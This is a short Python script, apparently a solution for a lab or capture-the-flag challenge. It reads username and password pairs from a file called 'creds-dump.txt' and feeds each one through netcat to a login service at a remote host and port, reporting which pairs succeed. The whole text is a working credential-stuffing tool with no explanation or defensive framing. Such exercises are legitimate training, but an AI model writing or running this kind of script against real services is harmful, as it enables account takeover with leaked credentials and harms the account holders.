import subprocess

HOST = "chatelaine.cylabacademy.net"
PORT = "34733"
failed_tried = "Invalid username or password"


with open("creds-dump.txt") as f:
    lines = [l.strip() for l in f if l.strip()]

for line in lines:
    try:
        username, password = line.split(";", 1)
    except ValueError:
        print(f"[skip] malformed line: {line!r}")
        continue

    input_data = f"{username}\n{password}\n".encode()

    try:
        result = subprocess.run(
            ["nc", HOST, PORT],
            input=input_data,
            capture_output=True,
            timeout=15,
        )
    except subprocess.TimeoutExpired:
        print(f"[timeout] {username}:{password}")
        continue

    output = result.stdout.decode(errors="replace")
    combined = output + result.stderr.decode(errors="replace")
    
    if failed_tried.lower() in combined.lower():
        print(f"[fail] {username}:{password}")

    else:
        print(f"[SUCCESS] {username}:{password}")
        print(combined)
        print("-" * 40)

